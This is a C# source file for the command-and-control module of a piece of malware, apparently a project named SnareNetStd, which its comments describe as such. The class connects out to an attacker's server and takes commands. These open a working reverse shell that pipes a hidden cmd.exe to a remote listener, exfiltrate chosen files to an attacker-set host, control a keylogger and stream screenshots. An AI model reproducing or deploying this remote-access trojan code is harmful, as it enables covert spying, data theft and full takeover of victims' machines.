using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SnareNetStd
{
    /// <summary>
    /// This is a pretty epic class that probably needs a bit of cleanup.
    /// </summary>
    class C2Connection
    {

        private string c2ip { get; set; }
        private int c2port { get; set; }
        // Setting these here because I'm using them at the class level, rather than trying to throw them between functions.
        private TcpClient c2Client { get; set; }
        private NetworkStream c2Stream { get; set; }
        private List<KeyValuePair<string, string>> commands { get; set; }

        // Can't believe I'm doing this... probably not the best way to do this.
        // Tells the main loop above if we should drop connection and re-initiate (wait)
        public bool waitState { get; set; }
        // Or tells the main loop that we should stop running.
        public bool exitState { get; set; }

        private ScreenshotTask sst = new ScreenshotTask();

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="ip">The Ip address to use</param>
        /// <param name="port">The Port to use</param>
        public C2Connection(string ip, int port)
        {
            c2ip = ip;
            c2port = port;
            commands = new List<KeyValuePair<string, string>>()
            {
                new KeyValuePair<string, string>("rev", "Reverse Shell(rev)"),
                new KeyValuePair<string, string>("revu", "Reverse Shell Setup(revu)"),
                new KeyValuePair<string, string>("exfil", "Exfiltrate a file (exfil)"),
                new KeyValuePair<string, string>("kle", "Keylogger enable(kle)"),
                new KeyValuePair<string, string>("kld", "Keylogger disable (kld)"),
                new KeyValuePair<string, string>("klf", "Fetch keylogger events"),
                new KeyValuePair<string, string>("sssu", "Screenshots Setup(sssu)"),
                new KeyValuePair<string, string>("ssta", "Screenshots start(ssta)"),
                new KeyValuePair<string, string>("sstp", "Screenshots stop (sstp)"),
                new KeyValuePair<string, string>("test", "Test state (test)"),
                new KeyValuePair<string, string>("wait", "Wait and reconnect (wait)"),
                new KeyValuePair<string, string>("shutdown", "Shutdown (shutdown)")
            };

            waitState = false;
            exitState = false;

            Config.Instance.C2.IPAddress = c2ip;
            Config.Instance.C2.PortNumber = c2port;
        }

        /// <summary>
        /// Function to set up the TCP communication for our piece of malware.
        /// </summary>
        public void Setup()
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (!string.IsNullOrWhiteSpace(c2ip))
            {
                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to c2 server.");
                try
                {
                    c2Client = new TcpClient(c2ip, c2port);
                    c2Stream = c2Client.GetStream();
                }
                catch (SocketException e)
                {
                    Console.WriteLine("C2 Connection Error");
                    throw new C2ConnectionException("Could not connect to C2 server.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }

        /// <summary>
        /// Sends a message back to the Attackers CnC server.
        /// </summary>
        /// <param name="message">Message to send</param>
        /// <returns>String response from the server</returns>
        public string sendMessage(string message)
        {
            byte[] messageData = Encoding.ASCII.GetBytes(message);
            c2Stream.Write(messageData, 0, messageData.Length);
            byte[] responseData = new byte[256];
            string response = string.Empty;
            int bytes = c2Stream.Read(responseData, 0, responseData.Length);
            response = Encoding.ASCII.GetString(responseData, 0, bytes);

            return response;
        }

        /// <summary>
        /// Fetch something to do from the control server.
        /// </summary>
        public void fetchCommand()
        {
            while (true)
            {
                try
                {
                    string options = "SNARE Controller Requesting Command, My Lord!\n";
                    foreach (string opt in commands.Select(c => c.Value).ToList())
                    {
                        options += $"{opt}\n";
                    }

                    byte[] optionsBytes = Encoding.ASCII.GetBytes(options);
                    c2Stream.Write(optionsBytes, 0, optionsBytes.Length);
                    byte[] responseData = new byte[256];
                    string response = string.Empty;
                    int bytes = c2Stream.Read(responseData, 0, responseData.Length);
                    response = Encoding.ASCII.GetString(responseData, 0, bytes);
                    string command = ParseCommand(response.Trim());
                    if (command == "nc")
                    {
                        Console.WriteLine("Invalid Command, looping back around");
                        continue;
                    }
                    runCommand(command);
                    break;

                }
                catch (Exception e) // Die gracefully if the connection drops or the attacker quits
                {
                    Console.WriteLine("Something went wrong");
                    Environment.Exit(1);
                }
            }

        }

        /// <summary>
        /// Makes sure the command entered is supported.
        /// Determine which 'module' (executive decision, we are calling them that now) was called when the attacker sends a multi-argument input
        /// New functionality for Exfil
        /// </summary>
        /// <param name="command">The command to validate</param>
        /// <returns>The command if it is supported, or "nc" if not supported</returns>
        public string ParseCommand(string command)
        {
            string module = command.Split(' ').FirstOrDefault(); 
            // Check if the returned command string is valid. if not error out.
            if (commands.Select(c => c.Key).ToList().Contains(module))
            {
                return command;
            }

            // nc = No Command, ie nothing was found as a valid command.
            Console.WriteLine("Invalid command entered");
            return "nc";
        }

        /// <summary>
        /// Execute the command against the target
        /// (This could be private and called by parseCommand above so that we know the command has been validated)
        /// </summary>
        /// <param name="command">The validated command to run</param>
        public void runCommand(string command)
        {
            try
            {
                string module = command.Split(' ').FirstOrDefault();

                if (module == "test")
                {
                    Console.WriteLine("Sending test message to server, will print response.");
                    string response = sendMessage("Testing Interaction with C2 Server\n");
                    Console.WriteLine("Recieved: {0}", response);
                }

                if (module == "wait")
                {
                    waitState = true;
                }

                if (module == "shutdown")
                {
                    exitState = true;
                }

                if (module == "exfil")
                {
                    bool configured = SetConfig(command, ConfigTypes.exfil, 4);
                    if (configured)
                    {
                        ExfilTask Exfiltrate = new ExfilTask();
                        Thread ExfilThread = new Thread(() => Exfiltrate.ExfilFile());
                        ExfilThread.Start();
                    }
                    else
                    {
                        string ErrorMessage = $"Could not configure Exfil with command: {command}";
                        Console.WriteLine(ErrorMessage);
                        sendMessage(ErrorMessage);
                        //waitState = true;
                    }
                }

                if (module == "revu")
                {
                    SetConfig(ConfigTypes.rev);
                }

                if (module == "rev")
                {
                    if (!Config.Instance.Rev.Any())
                    {
                        Console.WriteLine("You need to configure at least one rev worker with revu");
                        string response = sendMessage("You need to configure at least one rev worker with revu\n");
                        return;
                    }

                    // Try a shell on all the ip/ports in the list
                    foreach (var r in Config.Instance.Rev)
                    {
                        Thread reverseShellThread = new Thread(() => reverseShell(r.IPAddress, r.PortNumber));
                        reverseShellThread.Start();
                    }
                }

                if (module == "ssta")
                {
                    if (Config.Instance.Screenshot.IPAddress == null || Config.Instance.Screenshot.PortNumber == null)
                    {
                        Console.WriteLine("You need to configure the screenshot worker with sssu");
                        string response = sendMessage("You need to configure the screenshot worker with sssu\n");
                        return;
                    }
                    if (!sst.KeepGoing) // Is not already running ensures it only creates one thread
                    {
                        sst.KeepGoing = true;
                        Thread screenShotThread = new Thread(() => sst.TakeScreenshots());
                        screenShotThread.Start();
                    }
                    else
                    {
                        Console.WriteLine("Already spying on the screen.");
                        string response = sendMessage("Already spying on the screen.\n");
                    }
                }

                if (module == "sstp")
                {
                    Console.WriteLine("Stopping screenshots");
                    string response = sendMessage("Stopping screenshots\n");
                    sst.KeepGoing = false;
                }

                if (module == "sssu")
                {
                    SetConfig(ConfigTypes.screenshot);
                }

            }
            catch (Exception e) // Die gracefully if the connection drops or the attacker quits
            {
                return;
            }
        }

        /// <summary>
        /// Re-usable function to set config item values for ip/ports to phone home per action.
        /// </summary>
        /// <param name="setConfig">The strictly typed Enum of the config that is being updated</param>
        private void SetConfig(ConfigTypes setConfig)
        {
            string ipPrompt = "Enter Listener IP:Port\n";
            byte[] promptMsg = Encoding.ASCII.GetBytes(ipPrompt);
            c2Stream.Write(promptMsg, 0, promptMsg.Length);
            byte[] responseData = new byte[256];
            string response = string.Empty;
            int bytes = c2Stream.Read(responseData, 0, responseData.Length);
            response = Encoding.ASCII.GetString(responseData, 0, bytes);
            string[] ipPort = response.Trim().Split(':');
            string ip = ipPort[0];
            int.TryParse(ipPort[1], out int port);

            // This creates yet another place to update when we add a new one.. Enhancement: Look into using Dynamic Config object with ExpandoObject
            switch (setConfig)
            {
                case ConfigTypes.c2:
                    Config.Instance.C2.IPAddress = ip;
                    Config.Instance.C2.PortNumber = port;
                    break;
                case ConfigTypes.screenshot:
                    Config.Instance.Screenshot.IPAddress = ip;
                    Config.Instance.Screenshot.PortNumber = port;
                    break;
                case ConfigTypes.rev:
                    Config.Instance.Rev.Add(new IpPort() { IPAddress = ip, PortNumber = port });
                    break;
                default:
                    break;
            }

            Console.WriteLine("Recieved {0} {1}", ip, port.ToString());
        }

        /// <summary>
        /// Overload to handle setting config. SetConfig(ConfigTypes) will eventually be deprecated once this is fully implemented.
        /// Allows an attacker to enter the config as arguments so that modules can be run in one request
        /// </summary>
        /// <param name="command">The full command entered by the attacker</param>
        /// <param name="configType">Determines the config items that will be set</param>
        /// <param name="expectedArguments">The expected number of arguments that should have been supplied by the attacker</param>
        private bool SetConfig(string command, ConfigTypes configType, int expectedArguments)
        {
            bool result = false; // Assume the worst
            try
            {
                // Split the attackers command at every space, not including spaces within quotes ""
                var CommandAndArgs = command.Split('"')
                         .Select((element, index) => index % 2 == 0
                                               ? element.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries)
                                               : new string[] { element })
                         .SelectMany(element => element).ToList();

                switch (configType)
                {
                    case ConfigTypes.exfil:
                        if (CommandAndArgs.Count != expectedArguments) // dodgy input validation
                        {
                            result = false;
                            break;
                        }

                        Config.Instance.ExfilFile.TargetFilePath = CommandAndArgs[1];
                        Config.Instance.ExfilFile.IPAddress = CommandAndArgs[2];
                        int.TryParse(CommandAndArgs[3], out int port);
                        Config.Instance.ExfilFile.PortNumber = port;
                        result = true;
                        break;
                    default:
                        result = false;
                        break;
                }
            }
            catch (Exception e)
            {
                // Being lazy for now
                result = false;
            }


            return result;
        }

        /// <summary>
        /// Create a reverse shell and send it back to the attcker.
        /// </summary>
        /// <param name="ip">The IP address to send the shell to</param>
        /// <param name="port">The port to send the shell to</param>
        private void reverseShell(string ip, int port)
        {
            // Checks if things have been set up properly.
            // Namely that the IP and port are properly set.
            if (ip != null || port < 1)
            {
                // Create our client and stream for passing data.
                Console.WriteLine("Attempting connection to reverse shell reciever.");
                try
                {
                    // Set up our TCP client to talk to the reverse shell reciever (seperate from the C2 server, can be on the same box).
                    TcpClient revClient = new TcpClient(ip, port);
                    Stream revStream = revClient.GetStream();
                    StreamReader revStrmRdr = new StreamReader(revStream);
                    StreamWriter revStrmWtr = new StreamWriter(revStream);
                    StringBuilder revStrInput = new StringBuilder();

                    // Setup the piping to cmd.exe
                    Process shell = new Process();
                    shell.StartInfo.FileName = "cmd.exe";
                    shell.StartInfo.CreateNoWindow = true;
                    shell.StartInfo.UseShellExecute = false;
                    shell.StartInfo.RedirectStandardError = true;
                    shell.StartInfo.RedirectStandardInput = true;
                    shell.StartInfo.RedirectStandardOutput = true;
                    // Set up a handler to handle output from CMD back in to our stream, which will make it back to the reverse shell reciever.
                    shell.OutputDataReceived += new DataReceivedEventHandler(reverseShellOutputHandler);

                    // Handles response events from the reverse shell process.
                    void reverseShellOutputHandler(object sendingProcess, DataReceivedEventArgs outputLine)
                    {
                        StringBuilder strOutput = new StringBuilder();

                        if (!string.IsNullOrEmpty(outputLine.Data))
                        {
                            try
                            {
                                // Takes piped data from cmd.exe (via stdOut) and writes it to the stream writer hooked up to the socket.
                                strOutput.Append(outputLine.Data);
                                revStrmWtr.WriteLine(strOutput);
                                revStrmWtr.Flush();
                            }
                            catch (Exception err) { }
                        }
                    }

                    Console.WriteLine("Beginning Reverse Shell");
                    shell.Start();
                    shell.BeginOutputReadLine();
                    while (true)
                    {
                        // If this is true CMD has exited.
                        bool shellExit = false;
                        // Read a line from the socket input.
                        revStrInput.Append(revStrmRdr.ReadLine());
                        // Display said line for debugging purposes.
                        Console.WriteLine(revStrInput.ToString().Trim());
                        // If the input from the socket/reciever was "exit" then cmd.exe is going to close once we pass it the input.
                        // So set shellexit to be true.
                        if (revStrInput.ToString().Trim() == "exit")
                        {
                            shellExit = true;
                        }
                        shell.StandardInput.WriteLine(revStrInput);
                        // Clear our stringbuilding
                        revStrInput.Remove(0, revStrInput.Length);
                        // If cmd.exe has exited then we are good 2 go and can exit this loop, return us to normal operation.
                        if (shellExit)
                        {
                            break;
                        }
                    }

                    // Done. Close all our junk.
                    revStrmWtr.Close();
                    revStrmRdr.Close();
                    revStream.Close();
                    revClient.Close();
                    Console.WriteLine("Reverse shell finished.");
                }
                catch (SocketException e)
                {
                    Console.WriteLine("Connection Error");
                    throw new C2ConnectionException("Could not connect to reverse shell reciever.");
                }
            }
            else
            {
                Console.WriteLine("Uh oh, looks like no IP or port was set for connecting to C2");
            }
        }

        /// <summary>
        /// Close stuff we don't need. 
        /// </summary>
        public void tearDown()
        {
            c2Stream.Close();
            c2Client.Close();
            waitState = false;
            exitState = false;
        }

        /// <summary>
        /// If the connection fails...
        /// </summary>
        public class C2ConnectionException : Exception
        {
            public C2ConnectionException()
            {
            }

            public C2ConnectionException(string message) : base(message)
            {
            }
        }

        /// <summary>
        /// If the command is invalid
        /// </summary>
        public class C2InvalidCommandException : Exception
        {
            public C2InvalidCommandException()
            {

            }

            public C2InvalidCommandException(string message) : base(message)
            {

            }
        }
    }
}
